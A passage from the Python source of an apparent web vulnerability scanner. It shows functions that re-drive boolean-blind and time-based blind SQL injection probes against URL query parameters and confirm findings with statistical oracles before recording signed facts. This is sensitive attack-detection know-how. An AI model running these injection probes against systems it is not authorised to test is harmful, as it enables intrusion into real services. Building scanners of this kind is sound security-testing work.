                                            n_max=n_max)
                before, before_bodies = state["channels"], state["body_unavailable"]
                try:
                    fc = chk.probe(tmpl, point, send)
                except Exception as e:  # noqa: BLE001
                    res.notes.append(f"boolean probe error [{name}]: {type(e).__name__}: {e}")
                    continue
                if state["channels"] <= before or fc is None:
                    res.inconclusive.append((bug_class, f"{probe_url}#{point.id}"))
                    continue
                context = fc.to_verifier_context()
                # The oracle recomputes the TRUTH-VALUE ATTRIBUTION decision over the retained rounds; the
                # determinism baseline the check collected (identical false-clause sends) rides along as the
                # cheap pre-filter a confirm additionally requires (fail-closed).
                signal = boolean_inference_oracle(context.get("probe_rounds"),
                                                  discriminator=context.get("discriminator"),
                                                  false_baseline_samples=context.get("false_baseline_samples"))
                r = _admit_one(res, branch=_BOOLEAN_BRANCH, bug_class=bug_class,
                               engagement_slug=engagement_slug, signers=signers, context=context,
                               item=f"{probe_url}#{point.id}", surface=f"query:{name}",
                               fired=signal.fired, conclusive=signal.conclusive,
                               body_unreadable=state["body_unavailable"] > before_bodies)
                if r.is_fact:
                    fired_here = True
                    break
            if fired_here:
                break
    except Exception as e:  # noqa: BLE001 — a probe error never fabricates a FACT; record + return what held
        res.notes.append(f"boolean_redrive error: {type(e).__name__}: {e}")
    return res


def timing_redrive(url: str, *, slug: str, engagement_slug: str, signers: "list[tuple[str, str]]",
                   param: "str | None" = None, timeout: float = 8.0, samples: int = 6) -> "RuntimeRedriveResult":
    """Re-drive ``url`` for TIME-BASED blind injection and mint a signed FACT ONLY when the deterministic
    ``timing_oracle`` confirms a delay: a Mann-Whitney U rejection, a Hodges-Lehmann median shift clearing the
    effect-size floor, AND a dose-response that SCALES with the injected delay (a low + a high SLEEP dose).
    Benign and delay-injecting requests are interleaved (the reviewed ``TimingCheck`` discipline) so drift
    biases both equally, over VIGIL's OWN gated send.

    FP boundary (all → LEAD): a uniformly slow/loaded endpoint (the test fails to reject / the floor is not
    cleared), a one-off latency spike (no distribution shift), and a constant offset with no dose-response
    (the ratio fails to scale). Never raises."""
    from framework.v2.scanner.checks import TimingCheck  # noqa: PLC0415
    from framework.v2.scanner.insertion import HttpRequest, InsertionKind, RequestTemplate  # noqa: PLC0415
    from framework.v2.verify.oracles import timing_oracle  # noqa: PLC0415

    bug_class = "time_based_sqli"
    res, send, state = _stat_setup(url, slug, bug_class, _TIMING_BRANCH, timeout)
    if send is None:
        return res
    low_ms, high_ms = _TIMING_LOW_S * 1000.0, _TIMING_HIGH_S * 1000.0
    # A targeted re-drive of a KNOWN param probes ONLY that param (mirrors the errsig arm — bounded work on
    # the expensive timing arm); a captureless finding with no declared param falls back to the candidate set.
    max_params = 1 if param else _STAT_MAX_PARAMS
    try:
        for name in _candidate_names_hint(url, _TIMING_PARAMS, param, max_params):
            probe_url = _url_with_param(url, name)
            tmpl = RequestTemplate(HttpRequest(method="GET", url=probe_url))
            point = next((p for p in tmpl.insertion_points(kinds=(InsertionKind.QUERY_VALUE,))
                          if p.name.lower() == name.lower()), None)
            if point is None:
                continue
            fired_here = False
            for tpl in _TIMING_SLEEP_TEMPLATES:
                low = tpl.format(s=_TIMING_LOW_S)
                high = tpl.format(s=_TIMING_HIGH_S)
                chk = TimingCheck(id="timing-redrive", bug_class="time_based_sqli",
                                  benign=f"vigilbenign{_sha(name)}", sleep_payload=low, injected_ms=low_ms,
                                  samples=samples, dose_payload=high, dose_ms=high_ms)
                before = state["channels"]
                try:
                    fc = chk.probe(tmpl, point, send)
                except Exception as e:  # noqa: BLE001
                    res.notes.append(f"timing probe error [{name}]: {type(e).__name__}: {e}")
                    continue
                if state["channels"] <= before or fc is None:
                    res.inconclusive.append((bug_class, f"{probe_url}#{point.id}"))
                    continue
                context = fc.to_verifier_context()
                signal = timing_oracle(context.get("baseline_latencies") or [],
                                       context.get("treatment_latencies") or [],
                                       injected_ms=context.get("timing_injected_ms"),
                                       alpha=float(context.get("timing_alpha", 0.01)),
                                       dose=context.get("timing_dose"))
                # Timing is service-response (latency) derived, not body-derived — body readability is
                # irrelevant to this branch, so it never gates the admission.
                r = _admit_one(res, branch=_TIMING_BRANCH, bug_class=bug_class,
                               engagement_slug=engagement_slug, signers=signers, context=context,
                               item=f"{probe_url}#{point.id}", surface=f"query:{name}",
                               fired=signal.fired, conclusive=signal.conclusive, body_unreadable=False)
                if r.is_fact:
                    fired_here = True
                    break
            if fired_here:
                break
    except Exception as e:  # noqa: BLE001 — a probe error never fabricates a FACT; record + return what held
        res.notes.append(f"timing_redrive error: {type(e).__name__}: {e}")
    return res


def _sha(s: str) -> str:
    """A short, deterministic content-address token (no wallclock/rng) — used for benign control markers and
    per-probe nonces so a re-drive is replayable and the oracle re-fires identically offline."""
    import hashlib  # noqa: PLC0415 — stdlib
    return hashlib.sha256(str(s).encode("utf-8")).hexdigest()[:12]


def _body_text(resp: Any) -> str:
    """The response body as text (module-level twin of the ``_body`` closure in :func:`runtime_redrive`)."""
    return str(resp.get("body", "")) if isinstance(resp, dict) else str(resp)
